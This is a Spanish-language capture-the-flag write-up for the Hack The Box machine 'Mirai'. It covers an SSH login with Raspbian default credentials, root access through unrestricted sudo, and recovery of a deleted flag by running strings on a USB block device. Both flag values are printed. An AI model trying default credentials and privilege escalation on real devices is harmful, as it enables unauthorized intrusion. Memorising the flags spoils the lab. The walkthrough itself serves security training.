# Máquina Mirai (HTB)

- **IP:** 10.129.16.82
- **SO:** Linux (Raspberry Pi / Debian + Pi-hole)
- **Resumen de la cadena:** Raspbian con credenciales por defecto `pi:raspberry` → SSH → `sudo su` (el usuario pi tiene sudo sin restricciones) → root. La `root.txt` fue "borrada" del USB, se recupera con `strings` sobre el dispositivo `/dev/sdb`.
- **Estado:** Completa (user + root).

---

## 1. Reconocimiento

**[en Kali] NMAP:**
```
22/tcp open ssh      OpenSSH 6.7p1 Debian
53/tcp open domain   dnsmasq 2.76
80/tcp open http     lighttpd 1.4.35
```
- `dnsmasq` + lighttpd = pinta de Pi-hole en una Raspberry Pi → probar credenciales por defecto.

## 2. Acceso (user)

**[en Kali] SSH con credenciales por defecto de Raspbian:**
```bash
ssh pi@10.129.16.82
# password: raspberry
```

**[en la víctima] Flag de usuario:**
```bash
cd Desktop
ls          # Plex  user.txt
cat user.txt
# ff837707441b257a20e32199d7c8838d
```

## 3. Escalada de privilegios

**[en la víctima] El usuario `pi` puede hacer sudo sin restricciones:**
```bash
sudo su -
# ahora somos root
```

**[en la víctima] La root.txt original fue borrada; hay una nota:**
```bash
cat /root/root.txt
# I lost my original root.txt! I think I may have a backup on my USB stick...
```

**[en la víctima] Localizar el USB y mirar su contenido:**
```bash
df -h                       # /dev/sdb montado en /media/usbstick
ls /media/usbstick/         # damnit.txt  lost+found
cat /media/usbstick/damnit.txt
# Damnit! Sorry man I accidentally deleted your files off the USB stick. -James
```

**[en la víctima] Recuperar el contenido borrado con `strings` sobre el dispositivo de bloque:**
```bash
strings /dev/sdb
# ...
# 3d3e483143ff12ec505d026fa13e020b   <-- flag root recuperada
```

---

### Flags
| Flag | Valor |
|------|-------|
| user.txt | `ff837707441b257a20e32199d7c8838d` |
| root.txt | `3d3e483143ff12ec505d026fa13e020b` |

### Aprendizaje
- Credenciales por defecto (pi:raspberry) siguen siendo un clásico.
- Datos "borrados" de un dispositivo se recuperan a nivel de bloque con `strings /dev/sdX` (o herramientas forenses como `photorec`).
